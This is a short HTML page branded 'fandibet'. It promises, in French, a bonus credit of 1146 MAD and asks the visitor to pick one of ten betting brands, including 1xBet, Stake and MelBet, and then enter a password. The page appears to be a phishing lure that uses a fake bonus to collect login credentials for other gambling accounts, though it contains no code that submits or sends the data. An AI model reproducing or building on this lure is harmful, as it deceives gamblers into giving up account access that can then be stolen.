<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
  <meta charset="UTF-8" />
  <title>fandibet</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no" />
  <style>
    body {
      margin:0;
      background:#0b0c10;
      color:#fff;
      font-family:"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
    }
    header {
      background:#1c1c1c;
      height:44px;
      display:flex;
      justify-content:center;
      align-items:center;
    }
    .logo {
      font-size:16px;
      font-weight:500;
    }
    .bonus {
      text-align:left;
      padding:10px;
      font-size:13px;
    }
    .container {
      margin-top:20px;
      display:flex;
      justify-content:center;
    }
    .form-box {
      width:95%;
      max-width:320px;
      display:flex;
      flex-direction:column;
      gap:16px;
    }
    .input-group {
      display:flex;
      flex-direction:column;
      gap:4px;
    }
    .input-group label {
      font-size:13px;
      color:#fff;
    }
    .input-group select,
    .input-group input {
      width:100%;
      height:34px;
      border:none;
      border-radius:4px;
      background:#dfe4eb;
      font-size:13px;
      color:#000;
      padding:0 8px;
      box-sizing:border-box;
    }
    .input-group select:focus,
    .input-group input:focus {
      outline:none;
      box-shadow:none;
    }
  </style>
</head>
<body translate="no">
  <header>
    <div class="logo" translate="no">fandibet</div>
  </header>

  <div class="bonus" translate="no">Crédit d'un bonus d'un montant de 1146 MAD</div>

  <div class="container">
    <div class="form-box">
      <div class="input-group">
        <label for="username" translate="no">Numéro de compte</label>
        <select id="username" name="username" translate="no">
          <option>Betwinner</option>
          <option>888Starz</option>
          <option>Xparibet</option>
          <option>MelBet</option>
          <option>1xBet</option>
          <option>LINEBET</option>
          <option>Mega Pari</option>
          <option>Gooobet</option>
          <option>Stake</option>
          <option>MyStake</option>
        </select>
      </div>
      <div class="input-group">
        <label for="password" translate="no">Password</label>
        <input type="password" id="password" name="password" translate="no" />
      </div>
    </div>
  </div>
</body>
</html>
